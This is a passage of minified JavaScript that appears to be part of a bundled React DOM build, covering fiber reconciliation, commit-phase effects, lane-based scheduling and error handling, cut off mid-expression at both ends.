t.flags&128?(t.lanes=r,t):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(t.child.flags|=8192,t.mode&1&&(e===null||ve.current&1?Oe===0&&(Oe=3):uu())),t.updateQueue!==null&&(t.flags|=4),qe(t),null);case 4:return an(),Go(e,t),e===null&&na(t.stateNode.containerInfo),qe(t),null;case 10:return Kc(t.type._context),qe(t),null;case 17:return at(t.type)&&wi(),qe(t),null;case 19:if(xe(ve),i=t.memoizedState,i===null)return qe(t),null;if(s=(t.flags&128)!==0,l=i.rendering,l===null)if(s)Pn(i,!1);else{if(Oe!==0||e!==null&&e.flags&128)for(e=t.child;e!==null;){if(l=Ei(e),l!==null){for(t.flags|=128,Pn(i,!1),s=l.updateQueue,s!==null&&(t.updateQueue=s,t.flags|=4),t.subtreeFlags=0,s=r,r=t.child;r!==null;)i=r,e=s,i.flags&=14680066,l=i.alternate,l===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=l.childLanes,i.lanes=l.lanes,i.child=l.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=l.memoizedProps,i.memoizedState=l.memoizedState,i.updateQueue=l.updateQueue,i.type=l.type,e=l.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),r=r.sibling;return he(ve,ve.current&1|2),t.child}e=e.sibling}i.tail!==null&&Se()>on&&(t.flags|=128,s=!0,Pn(i,!1),t.lanes=4194304)}else{if(!s)if(e=Ei(l),e!==null){if(t.flags|=128,s=!0,r=e.updateQueue,r!==null&&(t.updateQueue=r,t.flags|=4),Pn(i,!0),i.tail===null&&i.tailMode==="hidden"&&!l.alternate&&!ge)return qe(t),null}else 2*Se()-i.renderingStartTime>on&&r!==1073741824&&(t.flags|=128,s=!0,Pn(i,!1),t.lanes=4194304);i.isBackwards?(l.sibling=t.child,t.child=l):(r=i.last,r!==null?r.sibling=l:t.child=l,i.last=l)}return i.tail!==null?(t=i.tail,i.rendering=t,i.tail=t.sibling,i.renderingStartTime=Se(),t.sibling=null,r=ve.current,he(ve,s?r&1|2:r&1),t):(qe(t),null);case 22:case 23:return cu(),s=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(t.flags|=8192),s&&t.mode&1?ct&1073741824&&(qe(t),t.subtreeFlags&6&&(t.flags|=8192)):qe(t),null;case 24:return null;case 25:return null}throw Error(A(156,t.tag))}function yx(e,t){switch(Wc(t),t.tag){case 1:return at(t.type)&&wi(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return an(),xe(nt),xe(Ke),Xc(),e=t.flags,e&65536&&!(e&128)?(t.flags=e&-65537|128,t):null;case 5:return Qc(t),null;case 13:if(xe(ve),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(A(340));sn()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return xe(ve),null;case 4:return an(),null;case 10:return Kc(t.type._context),null;case 22:case 23:return cu(),null;case 24:return null;default:return null}}var Ba=!1,He=!1,vx=typeof WeakSet=="function"?WeakSet:Set,U=null;function qs(e,t){var r=e.ref;if(r!==null)if(typeof r=="function")try{r(null)}catch(s){_e(e,t,s)}else r.current=null}function Jo(e,t,r){try{r()}catch(s){_e(e,t,s)}}var Cd=!1;function wx(e,t){if(Ao=xi,e=vf(),Fc(e)){if("selectionStart"in e)var r={start:e.selectionStart,end:e.selectionEnd};else e:{r=(r=e.ownerDocument)&&r.defaultView||window;var s=r.getSelection&&r.getSelection();if(s&&s.rangeCount!==0){r=s.anchorNode;var a=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{r.nodeType,i.nodeType}catch{r=null;break e}var l=0,o=-1,c=-1,u=0,h=0,p=e,x=null;t:for(;;){for(var v;p!==r||a!==0&&p.nodeType!==3||(o=l+a),p!==i||s!==0&&p.nodeType!==3||(c=l+s),p.nodeType===3&&(l+=p.nodeValue.length),(v=p.firstChild)!==null;)x=p,p=v;for(;;){if(p===e)break t;if(x===r&&++u===a&&(o=l),x===i&&++h===s&&(c=l),(v=p.nextSibling)!==null)break;p=x,x=p.parentNode}p=v}r=o===-1||c===-1?null:{start:o,end:c}}else r=null}r=r||{start:0,end:0}}else r=null;for(Oo={focusedElem:e,selectionRange:r},xi=!1,U=t;U!==null;)if(t=U,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,U=e;else for(;U!==null;){t=U;try{var f=t.alternate;if(t.flags&1024)switch(t.tag){case 0:case 11:case 15:break;case 1:if(f!==null){var w=f.memoizedProps,j=f.memoizedState,y=t.stateNode,m=y.getSnapshotBeforeUpdate(t.elementType===t.type?w:At(t.type,w),j);y.__reactInternalSnapshotBeforeUpdate=m}break;case 3:var g=t.stateNode.containerInfo;g.nodeType===1?g.textContent="":g.nodeType===9&&g.documentElement&&g.removeChild(g.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(A(163))}}catch(k){_e(t,t.return,k)}if(e=t.sibling,e!==null){e.return=t.return,U=e;break}U=t.return}return f=Cd,Cd=!1,f}function qn(e,t,r){var s=t.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var a=s=s.next;do{if((a.tag&e)===e){var i=a.destroy;a.destroy=void 0,i!==void 0&&Jo(t,r,i)}a=a.next}while(a!==s)}}function Xi(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var r=t=t.next;do{if((r.tag&e)===e){var s=r.create;r.destroy=s()}r=r.next}while(r!==t)}}function Yo(e){var t=e.ref;if(t!==null){var r=e.stateNode;switch(e.tag){case 5:e=r;break;default:e=r}typeof t=="function"?t(e):t.current=e}}function pm(e){var t=e.alternate;t!==null&&(e.alternate=null,pm(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[qt],delete t[ia],delete t[zo],delete t[rx],delete t[sx])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function xm(e){return e.tag===5||e.tag===3||e.tag===4}function Td(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||xm(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Qo(e,t,r){var s=e.tag;if(s===5||s===6)e=e.stateNode,t?r.nodeType===8?r.parentNode.insertBefore(e,t):r.insertBefore(e,t):(r.nodeType===8?(t=r.parentNode,t.insertBefore(e,r)):(t=r,t.appendChild(e)),r=r._reactRootContainer,r!=null||t.onclick!==null||(t.onclick=vi));else if(s!==4&&(e=e.child,e!==null))for(Qo(e,t,r),e=e.sibling;e!==null;)Qo(e,t,r),e=e.sibling}function Xo(e,t,r){var s=e.tag;if(s===5||s===6)e=e.stateNode,t?r.insertBefore(e,t):r.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Xo(e,t,r),e=e.sibling;e!==null;)Xo(e,t,r),e=e.sibling}var Me=null,It=!1;function gr(e,t,r){for(r=r.child;r!==null;)gm(e,t,r),r=r.sibling}function gm(e,t,r){if(Kt&&typeof Kt.onCommitFiberUnmount=="function")try{Kt.onCommitFiberUnmount(Vi,r)}catch{}switch(r.tag){case 5:He||qs(r,t);case 6:var s=Me,a=It;Me=null,gr(e,t,r),Me=s,It=a,Me!==null&&(It?(e=Me,r=r.stateNode,e.nodeType===8?e.parentNode.removeChild(r):e.removeChild(r)):Me.removeChild(r.stateNode));break;case 18:Me!==null&&(It?(e=Me,r=r.stateNode,e.nodeType===8?Wl(e.parentNode,r):e.nodeType===1&&Wl(e,r),ta(e)):Wl(Me,r.stateNode));break;case 4:s=Me,a=It,Me=r.stateNode.containerInfo,It=!0,gr(e,t,r),Me=s,It=a;break;case 0:case 11:case 14:case 15:if(!He&&(s=r.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){a=s=s.next;do{var i=a,l=i.destroy;i=i.tag,l!==void 0&&(i&2||i&4)&&Jo(r,t,l),a=a.next}while(a!==s)}gr(e,t,r);break;case 1:if(!He&&(qs(r,t),s=r.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=r.memoizedProps,s.state=r.memoizedState,s.componentWillUnmount()}catch(o){_e(r,t,o)}gr(e,t,r);break;case 21:gr(e,t,r);break;case 22:r.mode&1?(He=(s=He)||r.memoizedState!==null,gr(e,t,r),He=s):gr(e,t,r);break;default:gr(e,t,r)}}function Rd(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var r=e.stateNode;r===null&&(r=e.stateNode=new vx),t.forEach(function(s){var a=Tx.bind(null,e,s);r.has(s)||(r.add(s),s.then(a,a))})}}function Rt(e,t){var r=t.deletions;if(r!==null)for(var s=0;s<r.length;s++){var a=r[s];try{var i=e,l=t,o=l;e:for(;o!==null;){switch(o.tag){case 5:Me=o.stateNode,It=!1;break e;case 3:Me=o.stateNode.containerInfo,It=!0;break e;case 4:Me=o.stateNode.containerInfo,It=!0;break e}o=o.return}if(Me===null)throw Error(A(160));gm(i,l,a),Me=null,It=!1;var c=a.alternate;c!==null&&(c.return=null),a.return=null}catch(u){_e(a,t,u)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)ym(t,e),t=t.sibling}function ym(e,t){var r=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Rt(t,e),Wt(e),s&4){try{qn(3,e,e.return),Xi(3,e)}catch(w){_e(e,e.return,w)}try{qn(5,e,e.return)}catch(w){_e(e,e.return,w)}}break;case 1:Rt(t,e),Wt(e),s&512&&r!==null&&qs(r,r.return);break;case 5:if(Rt(t,e),Wt(e),s&512&&r!==null&&qs(r,r.return),e.flags&32){var a=e.stateNode;try{Qn(a,"")}catch(w){_e(e,e.return,w)}}if(s&4&&(a=e.stateNode,a!=null)){var i=e.memoizedProps,l=r!==null?r.memoizedProps:i,o=e.type,c=e.updateQueue;if(e.updateQueue=null,c!==null)try{o==="input"&&i.type==="radio"&&i.name!=null&&Dh(a,i),jo(o,l);var u=jo(o,i);for(l=0;l<c.length;l+=2){var h=c[l],p=c[l+1];h==="style"?Vh(a,p):h==="dangerouslySetInnerHTML"?Bh(a,p):h==="children"?Qn(a,p):Cc(a,h,p,u)}switch(o){case"input":go(a,i);break;case"textarea":Mh(a,i);break;case"select":var x=a._wrapperState.wasMultiple;a._wrapperState.wasMultiple=!!i.multiple;var v=i.value;v!=null?Gs(a,!!i.multiple,v,!1):x!==!!i.multiple&&(i.defaultValue!=null?Gs(a,!!i.multiple,i.defaultValue,!0):Gs(a,!!i.multiple,i.multiple?[]:"",!1))}a[ia]=i}catch(w){_e(e,e.return,w)}}break;case 6:if(Rt(t,e),Wt(e),s&4){if(e.stateNode===null)throw Error(A(162));a=e.stateNode,i=e.memoizedProps;try{a.nodeValue=i}catch(w){_e(e,e.return,w)}}break;case 3:if(Rt(t,e),Wt(e),s&4&&r!==null&&r.memoizedState.isDehydrated)try{ta(t.containerInfo)}catch(w){_e(e,e.return,w)}break;case 4:Rt(t,e),Wt(e);break;case 13:Rt(t,e),Wt(e),a=e.child,a.flags&8192&&(i=a.memoizedState!==null,a.stateNode.isHidden=i,!i||a.alternate!==null&&a.alternate.memoizedState!==null||(lu=Se())),s&4&&Rd(e);break;case 22:if(h=r!==null&&r.memoizedState!==null,e.mode&1?(He=(u=He)||h,Rt(t,e),He=u):Rt(t,e),Wt(e),s&8192){if(u=e.memoizedState!==null,(e.stateNode.isHidden=u)&&!h&&e.mode&1)for(U=e,h=e.child;h!==null;){for(p=U=h;U!==null;){switch(x=U,v=x.child,x.tag){case 0:case 11:case 14:case 15:qn(4,x,x.return);break;case 1:qs(x,x.return);var f=x.stateNode;if(typeof f.componentWillUnmount=="function"){s=x,r=x.return;try{t=s,f.props=t.memoizedProps,f.state=t.memoizedState,f.componentWillUnmount()}catch(w){_e(s,r,w)}}break;case 5:qs(x,x.return);break;case 22:if(x.memoizedState!==null){Ad(p);continue}}v!==null?(v.return=x,U=v):Ad(p)}h=h.sibling}e:for(h=null,p=e;;){if(p.tag===5){if(h===null){h=p;try{a=p.stateNode,u?(i=a.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(o=p.stateNode,c=p.memoizedProps.style,l=c!=null&&c.hasOwnProperty("display")?c.display:null,o.style.display=Wh("display",l))}catch(w){_e(e,e.return,w)}}}else if(p.tag===6){if(h===null)try{p.stateNode.nodeValue=u?"":p.memoizedProps}catch(w){_e(e,e.return,w)}}else if((p.tag!==22&&p.tag!==23||p.memoizedState===null||p===e)&&p.child!==null){p.child.return=p,p=p.child;continue}if(p===e)break e;for(;p.sibling===null;){if(p.return===null||p.return===e)break e;h===p&&(h=null),p=p.return}h===p&&(h=null),p.sibling.return=p.return,p=p.sibling}}break;case 19:Rt(t,e),Wt(e),s&4&&Rd(e);break;case 21:break;default:Rt(t,e),Wt(e)}}function Wt(e){var t=e.flags;if(t&2){try{e:{for(var r=e.return;r!==null;){if(xm(r)){var s=r;break e}r=r.return}throw Error(A(160))}switch(s.tag){case 5:var a=s.stateNode;s.flags&32&&(Qn(a,""),s.flags&=-33);var i=Td(e);Xo(e,i,a);break;case 3:case 4:var l=s.stateNode.containerInfo,o=Td(e);Qo(e,o,l);break;default:throw Error(A(161))}}catch(c){_e(e,e.return,c)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function bx(e,t,r){U=e,vm(e)}function vm(e,t,r){for(var s=(e.mode&1)!==0;U!==null;){var a=U,i=a.child;if(a.tag===22&&s){var l=a.memoizedState!==null||Ba;if(!l){var o=a.alternate,c=o!==null&&o.memoizedState!==null||He;o=Ba;var u=He;if(Ba=l,(He=c)&&!u)for(U=a;U!==null;)l=U,c=l.child,l.tag===22&&l.memoizedState!==null?Od(a):c!==null?(c.return=l,U=c):Od(a);for(;i!==null;)U=i,vm(i),i=i.sibling;U=a,Ba=o,He=u}Pd(e)}else a.subtreeFlags&8772&&i!==null?(i.return=a,U=i):Pd(e)}}function Pd(e){for(;U!==null;){var t=U;if(t.flags&8772){var r=t.alternate;try{if(t.flags&8772)switch(t.tag){case 0:case 11:case 15:He||Xi(5,t);break;case 1:var s=t.stateNode;if(t.flags&4&&!He)if(r===null)s.componentDidMount();else{var a=t.elementType===t.type?r.memoizedProps:At(t.type,r.memoizedProps);s.componentDidUpdate(a,r.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=t.updateQueue;i!==null&&pd(t,i,s);break;case 3:var l=t.updateQueue;if(l!==null){if(r=null,t.child!==null)switch(t.child.tag){case 5:r=t.child.stateNode;break;case 1:r=t.child.stateNode}pd(t,l,r)}break;case 5:var o=t.stateNode;if(r===null&&t.flags&4){r=o;var c=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":c.autoFocus&&r.focus();break;case"img":c.src&&(r.src=c.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var u=t.alternate;if(u!==null){var h=u.memoizedState;if(h!==null){var p=h.dehydrated;p!==null&&ta(p)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(A(163))}He||t.flags&512&&Yo(t)}catch(x){_e(t,t.return,x)}}if(t===e){U=null;break}if(r=t.sibling,r!==null){r.return=t.return,U=r;break}U=t.return}}function Ad(e){for(;U!==null;){var t=U;if(t===e){U=null;break}var r=t.sibling;if(r!==null){r.return=t.return,U=r;break}U=t.return}}function Od(e){for(;U!==null;){var t=U;try{switch(t.tag){case 0:case 11:case 15:var r=t.return;try{Xi(4,t)}catch(c){_e(t,r,c)}break;case 1:var s=t.stateNode;if(typeof s.componentDidMount=="function"){var a=t.return;try{s.componentDidMount()}catch(c){_e(t,a,c)}}var i=t.return;try{Yo(t)}catch(c){_e(t,i,c)}break;case 5:var l=t.return;try{Yo(t)}catch(c){_e(t,l,c)}}}catch(c){_e(t,t.return,c)}if(t===e){U=null;break}var o=t.sibling;if(o!==null){o.return=t.return,U=o;break}U=t.return}}var jx=Math.ceil,Ri=fr.ReactCurrentDispatcher,au=fr.ReactCurrentOwner,kt=fr.ReactCurrentBatchConfig,ee=0,$e=null,Te=null,Be=0,ct=0,Hs=Br(0),Oe=0,ha=null,ws=0,Zi=0,iu=0,Hn=null,rt=null,lu=0,on=1/0,er=null,Pi=!1,Zo=null,Or=null,Wa=!1,Nr=null,Ai=0,Kn=0,ec=null,li=-1,oi=0;function Xe(){return ee&6?Se():li!==-1?li:li=Se()}function Ir(e){return e.mode&1?ee&2&&Be!==0?Be&-Be:ax.transition!==null?(oi===0&&(oi=rf()),oi):(e=ae,e!==0||(e=window.event,e=e===void 0?16:uf(e.type)),e):1}function Mt(e,t,r,s){if(50<Kn)throw Kn=0,ec=null,Error(A(185));ka(e,r,s),(!(ee&2)||e!==$e)&&(e===$e&&(!(ee&2)&&(Zi|=r),Oe===4&&jr(e,Be)),it(e,s),r===1&&ee===0&&!(t.mode&1)&&(on=Se()+500,Ji&&Wr()))}function it(e,t){var r=e.callbackNode;a0(e,t);var s=pi(e,e===$e?Be:0);if(s===0)r!==null&&Bu(r),e.callbackNode=null,e.callbackPriority=0;else if(t=s&-s,e.callbackPriority!==t){if(r!=null&&Bu(r),t===1)e.tag===0?nx(Id.bind(null,e)):Tf(Id.bind(null,e)),ex(function(){!(ee&6)&&Wr()}),r=null;else{switch(sf(s)){case 1:r=Oc;break;case 4:r=ef;break;case 16:r=mi;break;case 536870912:r=tf;break;default:r=mi}r=Em(r,wm.bind(null,e))}e.callbackPriority=t,e.callbackNode=r}}function wm(e,t){if(li=-1,oi=0,ee&6)throw Error(A(327));var r=e.callbackNode;if(Zs()&&e.callbackNode!==r)return null;var s=pi(e,e===$e?Be:0);if(s===0)return null;if(s&30||s&e.expiredLanes||t)t=Oi(e,s);else{t=s;var a=ee;ee|=2;var i=jm();($e!==e||Be!==t)&&(er=null,on=Se()+500,ps(e,t));do try{Nx();break}catch(o){bm(e,o)}while(!0);Hc(),Ri.current=i,ee=a,Te!==null?t=0:($e=null,Be=0,t=Oe)}if(t!==0){if(t===2&&(a=Eo(e),a!==0&&(s=a,t=tc(e,a))),t===1)throw r=ha,ps(e,0),jr(e,s),it(e,Se()),r;if(t===6)jr(e,s);else{if(a=e.current.alternate,!(s&30)&&!kx(a)&&(t=Oi(e,s),t===2&&(i=Eo(e),i!==0&&(s=i,t=tc(e,i))),t===1))throw r=ha,ps(e,0),jr(e,s),it(e,Se()),r;switch(e.finishedWork=a,e.finishedLanes=s,t){case 0:case 1:throw Error(A(345));case 2:ls(e,rt,er);break;case 3:if(jr(e,s),(s&130023424)===s&&(t=lu+500-Se(),10<t)){if(pi(e,0)!==0)break;if(a=e.suspendedLanes,(a&s)!==s){Xe(),e.pingedLanes|=e.suspendedLanes&a;break}e.timeoutHandle=$o(ls.bind(null,e,rt,er),t);break}ls(e,rt,er);break;case 4:if(jr(e,s),(s&4194240)===s)break;for(t=e.eventTimes,a=-1;0<s;){var l=31-Dt(s);i=1<<l,l=t[l],l>a&&(a=l),s&=~i}if(s=a,s=Se()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*jx(s/1960))-s,10<s){e.timeoutHandle=$o(ls.bind(null,e,rt,er),s);break}ls(e,rt,er);break;case 5:ls(e,rt,er);break;default:throw Error(A(329))}}}return it(e,Se()),e.callbackNode===r?wm.bind(null,e):null}function tc(e,t){var r=Hn;return e.current.memoizedState.isDehydrated&&(ps(e,t).flags|=256),e=Oi(e,t),e!==2&&(t=rt,rt=r,t!==null&&rc(t)),e}function rc(e){rt===null?rt=e:rt.push.apply(rt,e)}function kx(e){for(var t=e;;){if(t.flags&16384){var r=t.updateQueue;if(r!==null&&(r=r.stores,r!==null))for(var s=0;s<r.length;s++){var a=r[s],i=a.getSnapshot;a=a.value;try{if(!Ft(i(),a))return!1}catch{return!1}}}if(r=t.child,t.subtreeFlags&16384&&r!==null)r.return=t,t=r;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function jr(e,t){for(t&=~iu,t&=~Zi,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var r=31-Dt(t),s=1<<r;e[r]=-1,t&=~s}}function Id(e){if(ee&6)throw Error(A(327));Zs();var t=pi(e,0);if(!(t&1))return it(e,Se()),null;var r=Oi(e,t);if(e.tag!==0&&r===2){var s=Eo(e);s!==0&&(t=s,r=tc(e,s))}if(r===1)throw r=ha,ps(e,0),jr(e,t),it(e,Se()),r;if(r===6)throw Error(A(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,ls(e,rt,er),it(e,Se()),null}function ou(e,t){var r=ee;ee|=1;try{return e(t)}finally{ee=r,ee===0&&(on=Se()+500,Ji&&Wr())}}function bs(e){Nr!==null&&Nr.tag===0&&!(ee&6)&&Zs();var t=ee;ee|=1;var r=kt.transition,s=ae;try{if(kt.transition=null,ae=1,e)return e()}finally{ae=s,kt.transition=r,ee=t,!(ee&6)&&Wr()}}function cu(){ct=Hs.current,xe(Hs)}function ps(e,t){e.finishedWork=null,e.finishedLanes=0;var r=e.timeoutHandle;if(r!==-1&&(e.timeoutHandle=-1,Z0(r)),Te!==null)for(r=Te.return;r!==null;){var s=r;switch(Wc(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&wi();break;case 3:an(),xe(nt),xe(Ke),Xc();break;case 5:Qc(s);break;case 4:an();break;case 13:xe(ve);break;case 19:xe(ve);break;case 10:Kc(s.type._context);break;case 22:case 23:cu()}r=r.return}if($e=e,Te=e=$r(e.current,null),Be=ct=t,Oe=0,ha=null,iu=Zi=ws=0,rt=Hn=null,hs!==null){for(t=0;t<hs.length;t++)if(r=hs[t],s=r.interleaved,s!==null){r.interleaved=null;var a=s.next,i=r.pending;if(i!==null){var l=i.next;i.next=a,s.next=l}r.pending=s}hs=null}return e}function bm(e,t){do{var r=Te;try{if(Hc(),ni.current=Ti,Ci){for(var s=we.memoizedState;s!==null;){var a=s.queue;a!==null&&(a.pending=null),s=s.next}Ci=!1}if(vs=0,Ie=Ae=we=null,Vn=!1,ca=0,au.current=null,r===null||r.return===null){Oe=1,ha=t,Te=null;break}e:{var i=e,l=r.return,o=r,c=t;if(t=Be,o.flags|=32768,c!==null&&typeof c=="object"&&typeof c.then=="function"){var u=c,h=o,p=h.tag;if(!(h.mode&1)&&(p===0||p===11||p===15)){var x=h.alternate;x?(h.updateQueue=x.updateQueue,h.memoizedState=x.memoizedState,h.lanes=x.lanes):(h.updateQueue=null,h.memoizedState=null)}var v=bd(l);if(v!==null){v.flags&=-257,jd(v,l,o,i,t),v.mode&1&&wd(i,u,t),t=v,c=u;var f=t.updateQueue;if(f===null){var w=new Set;w.add(c),t.updateQueue=w}else f.add(c);break e}else{if(!(t&1)){wd(i,u,t),uu();break e}c=Error(A(426))}}else if(ge&&o.mode&1){var j=bd(l);if(j!==null){!(j.flags&65536)&&(j.flags|=256),jd(j,l,o,i,t),Vc(ln(c,o));break e}}i=c=ln(c,o),Oe!==4&&(Oe=2),Hn===null?Hn=[i]:Hn.push(i),i=l;do{switch(i.tag){case 3:i.flags|=65536,t&=-t,i.lanes|=t;var y=nm(i,c,t);md(i,y);break e;case 1:o=c;var m=i.type,g=i.stateNode;if(!(i.flags&128)&&(typeof m.getDerivedStateFromError=="function"||g!==null&&typeof g.componentDidCatch=="function"&&(Or===null||!Or.has(g)))){i.flags|=65536,t&=-t,i.lanes|=t;var k=am(i,o,t);md(i,k);break e}}i=i.return}while(i!==null)}_m(r)}catch(C){t=C,Te===r&&r!==null&&(Te=r=r.return);continue}break}while(!0)}function jm(){var e=Ri.current;return Ri.current=Ti,e===null?Ti:e}function uu(){(Oe===0||Oe===3||Oe===2)&&(Oe=4),$e===null||!(ws&268435455)&&!(Zi&268435455)||jr($e,Be)}function Oi(e,t){var r=ee;ee|=2;var s=jm();($e!==e||Be!==t)&&(er=null,ps(e,t));do try{_x();break}catch(a){bm(e,a)}while(!0);if(Hc(),ee=r,Ri.current=s,Te!==null)throw Error(A(261));return $e=null,Be=0,Oe}function _x(){for(;Te!==null;)km(Te)}function Nx(){for(;Te!==null&&!Yp();)km(Te)}function km(e){var t=Sm(e.alternate,e,ct);e.memoizedProps=e.pendingProps,t===null?_m(e):Te=t,au.current=null}function _m(e){var t=e;do{var r=t.alternate;if(e=t.return,t.flags&32768){if(r=yx(r,t),r!==null){r.flags&=32767,Te=r;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{Oe=6,Te=null;return}}else if(r=gx(r,t,ct),r!==null){Te=r;return}if(t=t.sibling,t!==null){Te=t;return}Te=t=e}while(t!==null);Oe===0&&(Oe=5)}function ls(e,t,r){var s=ae,a=kt.transition;try{kt.transition=null,ae=1,Sx(e,t,r,s)}finally{kt.transition=a,ae=s}return null}function Sx(e,t,r,s){do Zs();while(Nr!==null);if(ee&6)throw Error(A(327));r=e.finishedWork;var a=e.finishedLanes;if(r===null)return null;if(e.finishedWork=null,e.finishedLanes=0,r===e.current)throw Error(A(177));e.callbackNode=null,e.callbackPriority=0;var i=r.lanes|r.childLanes;if(i0(e,i),e===$e&&(Te=$e=null,Be=0),!(r.subtreeFlags&2064)&&!(r.flags&2064)||Wa||(Wa=!0,Em(mi,function(){return Zs(),null})),i=(r.flags&15990)!==0,r.subtreeFlags&15990||i){i=kt.transition,kt.transition=null;var l=ae;ae=1;var o=ee;ee|=4,au.current=null,wx(e,r),ym(r,e),H0(Oo),xi=!!Ao,Oo=Ao=null,e.current=r,bx(r),Qp(),ee=o,ae=l,kt.transition=i}else e.current=r;if(Wa&&(Wa=!1,Nr=e,Ai=a),i=e.pendingLanes,i===0&&(Or=null),e0(r.stateNode),it(e,Se()),t!==null)for(s=e.onRecoverableError,r=0;r<t.length;r++)a=t[r],s(a.value,{componentStack:a.stack,digest:a.digest});if(Pi)throw Pi=!1,e=Zo,Zo=null,e;return Ai&1&&e.tag!==0&&Zs(),i=e.pendingLanes,i&1?e===ec?Kn++:(Kn=0,ec=e):Kn=0,Wr(),null}function Zs(){if(Nr!==null){var e=sf(Ai),t=kt.transition,r=ae;try{if(kt.transition=null,ae=16>e?16:e,Nr===null)var s=!1;else{if(e=Nr,Nr=null,Ai=0,ee&6)throw Error(A(331));var a=ee;for(ee|=4,U=e.current;U!==null;){var i=U,l=i.child;if(U.flags&16){var o=i.deletions;if(o!==null){for(var c=0;c<o.length;c++){var u=o[c];for(U=u;U!==null;){var h=U;switch(h.tag){case 0:case 11:case 15:qn(8,h,i)}var p=h.child;if(p!==null)p.return=h,U=p;else for(;U!==null;){h=U;var x=h.sibling,v=h.return;if(pm(h),h===u){U=null;break}if(x!==null){x.return=v,U=x;break}U=v}}}var f=i.alternate;if(f!==null){var w=f.child;if(w!==null){f.child=null;do{var j=w.sibling;w.sibling=null,w=j}while(w!==null)}}U=i}}if(i.subtreeFlags&2064&&l!==null)l.return=i,U=l;else e:for(;U!==null;){if(i=U,i.flags&2048)switch(i.tag){case 0:case 11:case 15:qn(9,i,i.return)}var y=i.sibling;if(y!==null){y.return=i.return,U=y;break e}U=i.return}}var m=e.current;for(U=m;U!==null;){l=U;var g=l.child;if(l.subtreeFlags&2064&&g!==null)g.return=l,U=g;else e:for(l=m;U!==null;){if(o=U,o.flags&2048)try{switch(o.tag){case 0:case 11:case 15:Xi(9,o)}}catch(C){_e(o,o.return,C)}if(o===l){U=null;break e}var k=o.sibling;if(k!==null){k.return=o.return,U=k;break e}U=o.return}}if(ee=a,Wr(),Kt&&typeof Kt.onPostCommitFiberRoot=="function")try{Kt.onPostCommitFiberRoot(Vi,e)}catch{}s=!0}return s}finally{ae=r,kt.transition=t}}return!1}function $d(e,t,r){t=ln(r,t),t=nm(e,t,1),e=Ar(e,t,1),t=Xe(),e!==null&&(ka(e,1,t),it(e,t))}function _e(e,t,r){if(e.tag===3)$d(e,e,r);else for(;t!==null;){if(t.tag===3){$d(t,e,r);break}else if(t.tag===1){var s=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(Or===null||!Or.has(s))){e=ln(r,e),e=am(t,e,1),t=Ar(t,e,1),e=Xe(),t!==null&&(ka(t,1,e),it(t,e));break}}t=t.return}}function Ex(e,t,r){var s=e.pingCache;s!==null&&s.delete(t),t=Xe(),e.pingedLanes|=e.suspendedLanes&r,$e===e&&(Be&r)===r&&(Oe===4||Oe===3&&(Be&130023424)===Be&&500>Se()-lu?ps(e,0):iu|=r),it(e,t)}function Nm(e,t){t===0&&(e.mode&1?(t=Oa,Oa<<=1,!(Oa&130023424)&&(Oa=4194304)):t=1);var r=Xe();e=ur(e,t),e!==null&&(ka(e,t,r),it(e,r))}function Cx(e){var t=e.memoizedState,r=0;t!==null&&(r=t.retryLane),Nm(e,r)}function Tx(e,t){var r=0;switch(e.tag){case 13:var s=e.stateNode,a=e.memoizedState;a!==null&&(r=a.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(A(314))}s!==null&&s.delete(t),Nm(e,r)}var Sm;Sm=function(e,t,r){if(e!==null)if(e.memoizedProps!==t.pendingProps||nt.current)st=!0;else{if(!(e.lanes&r)&&!(t.flags&128))return st=!1,xx(e,t,r);st=!!(e.flags&131072)}else st=!1,ge&&t.flags&1048576&&Rf(t,ki,t.index);switch(t.lanes=0,t.tag){case 2:var s=t.type;ii(e,t),e=t.pendingProps;var 